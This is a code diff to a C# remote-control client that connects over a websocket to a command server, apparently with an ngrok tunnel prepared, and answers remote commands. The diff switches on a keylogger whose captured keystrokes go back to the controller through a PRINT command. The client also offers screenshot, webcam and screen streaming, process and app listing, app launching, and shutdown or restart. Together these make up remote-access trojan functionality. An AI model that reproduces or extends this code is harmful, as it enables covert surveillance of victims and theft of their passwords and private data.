@@ -5,6 +5,7 @@
 //using System.IO;
 //using KeyLogger;
 //using Microsoft.VisualBasic.Logging;
+//using KeyLogger;
 using System.Diagnostics;
 using System.Drawing.Imaging;
 
@@ -20,13 +21,18 @@ using System.Text.Json;
 
 class Program
 {
+    // websocket
     static ClientWebSocket ws = new ClientWebSocket();
 
+    // webcam
     static Webcam webcam = new Webcam();
     static bool webcamRunning = false;
+
+    // screen streaming
     static bool screenStreaming = false;
 
-    //static KeylogController kl = new KeylogController();
+    // key logger
+    static KeylogController kl = new KeylogController();
 
     static async Task Main(string[] args)
     {
@@ -35,7 +41,6 @@ class Program
         await ws.ConnectAsync(new Uri("ws://localhost:5000/ws"), CancellationToken.None);
         //await ws.ConnectAsync(new Uri("wss://abigail-conciliable-hyun.ngrok-free.dev/ws/"), CancellationToken.None);
     
-
         // REGISTER
         await Send(new
         {
@@ -89,25 +94,26 @@ class Program
         //// ================= NORMAL COMMAND =================
         switch (command)
         {
-            //case "KEYLOG":
-            //    kl.Start();
-            //    break;
+            case "SHUTDOWN":
+                shutdown();
+                break;
+            
+            case "RESTART":
+                restart();
+                break;
 
-            //case "HOOK":
-            //    kl.Hook();
-            //    break;
+            case "HOOK":
+                kl.Start();
+                Console.WriteLine("Start");
+                break;
 
-            //case "UNHOOK":
-            //    kl.Unhook();
-            //    break;
+            case "PRINT":
+                sendText(from, command.ToLower(), kl.PrintKeys());
+                break;
 
-            //case "PRINT":
-            //    sendText(from, command.ToLower(), kl.PrintKeys());
-            //    break;
-
-            //case "EXIT":
-            //    kl.Stop();
-            //    break;
+            case "EXIT":
+                kl.Stop();
+                break;
 
             case "SCREENSHOT-TAKE":
                 sendImage(from, take());
@@ -152,11 +158,7 @@ class Program
             case "APP-START":
                 string an = root.GetProperty("an").GetString();
                 sendText(from, command.ToLower(), startApp(an));
-                break;
-
-            case "SHUTDOWN":
-                shutdown();
-                break;
+                break;            
 
             case "WEBCAM-START":
                 webcam.Start();
@@ -180,39 +182,10 @@ class Program
             default:
                 return;
         }
-
-        // ================= KEYLOG MODE =================
-        //if (keylogMode)
-        //{
-        //    switch (command)
-        //    {
-        //        case "HOOK":
-        //            kl.Hook();
-        //            Console.WriteLine("Enter keylog mode");
-        //            break;
-
-        //        case "UNHOOK":
-        //            kl.Unhook();
-        //            break;
-
-        //        case "PRINT":
-        //            kl.PrintKeys();
-        //            break;
-
-        //        case "EXIT":
-        //            kl.Stop();
-        //            keylogMode = false;
-        //            Console.WriteLine("Exit keylog mode");
-        //            break;
-        //    }
-
-        //    return; // ⚠️ IMPORTANT: stop here
-        //}
-
-
     }
 
-    // ================= SEND =================
+    // ================= SEND FUNCTION =================
+
     static async Task Send(object obj)
     {
         var json = JsonSerializer.Serialize(obj);
@@ -226,8 +199,6 @@ class Program
 
     static async void sendText(string target, string commands, string text)
     {
-        //string base64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(text));
-
         await Send(new
         {
             type = "response",
@@ -241,7 +212,6 @@ class Program
     static async void sendImage(string target, byte[] data)
     {
         string base64 = Convert.ToBase64String(data);
-
         await Send(new
         {
             type = "response",
@@ -252,12 +222,11 @@ class Program
     }
 
 
-    //// ================= FEATURES =================
+    //// ================= FEATURES FUNCTION =================
 
     static async void listProcess(string target)
     {
         var processes = getProcess();
-
         await Send(new
         {
             type = "response",
@@ -323,7 +292,6 @@ class Program
     static async void listApp(string target)
     {
         var apps = getApp();
-
         await Send(new
         {
             type = "response",
@@ -449,32 +417,13 @@ class Program
         }
     }
 
-    //static void hook(ref Thread tklog)
-    //{
-    //    String s = "";
-    //    tklog.Start();
-    //    //File.WriteAllText(appstart.path, "");
-    //}
-
-    //static void unhook(ref Thread tklog)
-    //{
-    //    tklog.Suspend();
-    //}
-
-    //static string printKey()
-    //{
-    //    String s = "";
-    //    s = File.ReadAllText(appstart.path);
-    //    //File.WriteAllText(appstart.path, "");
-
-    //    if (s == "")
-    //        s = "\0";
-
-    //    return s;
-    //}
-
     static void shutdown()
     {
         System.Diagnostics.Process.Start("ShutDown", "-s");
+    }
+
+    static void restart()
+    {
+        System.Diagnostics.Process.Start("ShutDown", "-r");
     }
 }
